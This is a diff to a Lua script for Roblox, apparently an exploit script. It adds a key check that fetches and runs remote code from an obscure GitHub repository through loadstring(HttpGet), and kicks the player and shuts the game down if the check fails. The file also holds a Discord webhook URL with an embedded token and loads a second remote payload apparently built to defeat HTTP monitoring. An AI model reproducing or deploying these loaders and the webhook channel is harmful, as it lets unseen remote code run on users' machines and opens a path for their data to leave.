@@ -1,3 +1,12 @@
+if getgenv().key == 'LJB&^$KLBVTY)(*&^NKLK' then
+loadstring(game:HttpGet("https://raw.githubusercontent.com/01010101010x/010100101/main/LocalAntiBan"))();
+else
+    game:GetService("Players").LocalPlayer:Kick("Error Connection | Reason : Detected Spoof |")
+    wait(2)
+    game:shutdown()
+end
+
+
 local webh = "https://discord.com/api/webhooks/1045159714780090491/rHMUgoYrtsV-T82dEBJVvhBfzh8MT66_dCk9mMa7-YM5xAtRZxJ7XRvBktjmz9FXLB-R"
 
 
@@ -137,14 +146,3 @@ end)
 loadstring(game:HttpGet("https://raw.githubusercontent.com/01010101010x/010100101/main/LocalAntiBan"))();
 
 loadstring(game:HttpGet("https://raw.githubusercontent.com/01010101010x/010100101/main/UcantusehttpspyLOLNERD"))();
-
-getgenv().key = 'LJB&^$KLBVTY)(*&^NKLK';
-
-
-if getgenv().key == 'LJB&^$KLBVTY)(*&^NKLK' then
-loadstring(game:HttpGet("https://raw.githubusercontent.com/01010101010x/010100101/main/LocalAntiBan"))();
-else
-    game:GetService("Players").LocalPlayer:Kick("Error Connection | Reason : Detected Spoof |")
-    wait(2)
-    game:shutdown()
-end
